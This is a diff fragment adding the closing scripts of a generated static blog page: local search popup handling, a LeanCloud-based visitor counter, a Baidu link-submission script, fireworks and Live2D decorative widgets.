+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("TSaUMM9qwI423iWuECxQWDDh-gzGzoHsz", "2DucY6TQAx8iNNnjFYelMbXV");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+
+  
+
+  
+
+  
+  <script type="text/javascript" src="/js/src/exturl.js?v=5.1.4"></script>
+
+
+  
+  
+ <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+ <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+ <script type="text/javascript" src="/js/src/fireworks.js"></script>
+
+
+<div class="bg_content">
+<canvas id="canvas"></canvas>
+</div>
+<!-- 雪花特效 -->
+<!--<script type="text/javascript">
+
+    document.write('<script type="text/javascript" src="/js/src/snow2.js"><\/script>');
+
+</script>-->
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"left","width":100,"height":200},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<script type="text/javascript" src="/js/src/dynamic_bg.js"></script>
